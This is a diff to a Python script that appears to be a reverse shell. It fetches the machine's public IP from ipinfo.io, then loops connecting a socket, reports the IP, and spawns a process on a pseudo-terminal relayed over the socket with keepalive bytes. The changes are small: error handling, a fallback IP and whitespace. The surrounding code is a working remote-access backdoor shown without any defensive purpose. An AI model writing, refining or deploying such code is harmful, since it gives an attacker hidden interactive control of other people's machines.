@@ -58,15 +58,18 @@ def main():
     
     true_ip = "Unknown IP"
     try:
-        
+
         req = urllib.request.Request(
             "http://ipinfo.io", 
             headers={'User-Agent': 'curl/7.68.0'}
         )
         with urllib.request.urlopen(req, timeout=4) as response:
-            true_ip = json.loads(response.read().decode()).get("ip", "Unknown IP")
-    except:
-        pass
+
+            raw_data = response.read().decode('utf-8', errors='ignore')
+            true_ip = json.loads(raw_data).get("ip", "Unknown IP")
+    except Exception as e:
+
+        true_ip = "127.0.0.1"
 
     while True:
         s = None
@@ -83,8 +86,9 @@ def main():
 
             clean_ip_string = str(true_ip).strip()
             
+
             s.sendall(f"{clean_ip_string}\n".encode('utf-8'))
-            s.sendall(b"\r\n")
+            s.sendall(b"\r\n") 
             
             master, slave = os.openpty()
             p = subprocess.Popen(
@@ -98,7 +102,7 @@ def main():
                 r, w, x = select.select([s, master], [], [], 5)
                 if not r:
                     try:
-                        s.send(b"\x00") 
+                        s.send(b"\x00")
                     except:
                         break
                     continue
